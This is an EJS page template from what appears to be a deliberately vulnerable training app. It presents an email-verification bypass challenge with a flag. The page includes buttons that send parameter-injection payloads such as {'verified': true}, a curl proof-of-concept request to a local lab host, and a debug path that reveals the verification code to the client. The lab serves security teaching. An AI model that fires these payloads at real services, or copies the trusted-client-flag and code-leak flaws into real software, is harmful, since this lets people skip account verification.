<%- include('../partials/navbar') %>
<main class="main-content">
  <div class="top-header"><span class="header-title">Email Verification</span>
    <div class="header-right"><a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a></div>
  </div>
  <div class="page-body">
    <div style="max-width:900px;display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start;">
      <div>
        <div class="card" style="border-color:var(--warning);">
          <div class="card-header" style="background:#FFFBEB;"><h3>📧 Email Verification Bypass</h3><span class="badge badge-warning">Logic Flaw</span></div>
          <div class="card-body">
            <div id="result" style="display:none;margin-bottom:14px;"></div>
            <div style="background:var(--page-bg);border:1px solid var(--border);border-radius:var(--radius);padding:12px;margin-bottom:14px;font-size:12px;">
              <div style="font-weight:700;margin-bottom:4px;">Current State</div>
              <div>Verified: <strong style="color:<%= state.verified?'var(--success)':'var(--danger)' %>;"><%= state.verified ? '✅ Yes' : '❌ No' %></strong></div>
              <div>Attempts: <strong><%= state.attempts || 0 %></strong></div>
            </div>
            <div style="display:flex;flex-direction:column;gap:8px;">
              <button onclick="sendCode()" class="btn btn-secondary">📲 Send Verification Code</button>
              <div id="code-section" style="display:none;">
                <div class="form-group" style="margin-top:8px;"><label>Verification Code</label>
                  <input type="text" id="code-input" maxlength="6" placeholder="000000" style="font-family:monospace;font-size:20px;letter-spacing:6px;text-align:center;">
                </div>
                <button onclick="verifyNormal()" class="btn btn-primary" style="width:100%;margin-bottom:6px;">Verify Code (Normal)</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div>
        <div class="card mb-4" style="border-color:var(--danger);">
          <div class="card-header" style="background:var(--danger-bg);"><h3>⚠️ Bypass Attacks</h3></div>
          <div class="card-body" style="display:flex;flex-direction:column;gap:6px;">
            <button onclick="bypass('verified',true)"        class="btn btn-danger btn-sm">{"verified": true}</button>
            <button onclick="bypass('skip_verification',true)" class="btn btn-danger btn-sm">{"skip_verification": true}</button>
            <button onclick="bypass('status','verified')"    class="btn btn-danger btn-sm">{"status": "verified"}</button>
            <button onclick="bypass('email_verified',true)"  class="btn btn-danger btn-sm">{"email_verified": true}</button>
            <button onclick="bypass('verification_status','complete')" class="btn btn-danger btn-sm">{"verification_status": "complete"}</button>
            <button onclick="bypass('bypass',true)"         class="btn btn-warning btn-sm">{"bypass": true}</button>
          </div>
        </div>
        <div class="card">
          <div class="card-header"><h3>curl PoC</h3></div>
          <div class="card-body">
            <pre style="font-size:11px;">curl -X POST http://syntex.local/email-verify/confirm \
  -H "Cookie: SYNTEX_SESS=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code":"000000","verified":true}'</pre>
          </div>
        </div>
      </div>
    </div>
  </div>
</main>
</div><%- include('../partials/footer') %>
<script>
async function sendCode() {
  const r = await fetch('/email-verify/send', {method:'POST', headers:{'Content-Type':'application/json'}});
  const d = await r.json();
  document.getElementById('code-section').style.display = 'block';
  if (d.debug?.code) document.getElementById('code-input').value = d.debug.code;
  showResult('info', 'Code sent. ' + (d.debug?.code ? `Beginner hint — code: ${d.debug.code}` : 'Check your email.'));
}
async function verifyNormal() {
  const code = document.getElementById('code-input').value;
  await send({code});
}
async function bypass(key, val) {
  const body = {code:'000000'};
  body[key] = val;
  await send(body);
}
async function send(body) {
  const r = await fetch('/email-verify/confirm', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
  const d = await r.json();
  if (d.flag) showResult('danger', `⚠️ BYPASSED! Method: ${d.method || 'param'} <br><code style="color:var(--success)">🚩 ${d.flag}</code>`);
  else if (d.success) showResult('success', '✅ Email verified correctly.');
  else showResult('warning', '❌ ' + d.message);
}
function showResult(type, html) {
  const box = document.getElementById('result');
  box.style.display = 'block';
  box.innerHTML = `<div class="alert alert-${type}">${html}</div>`;
}
</script>
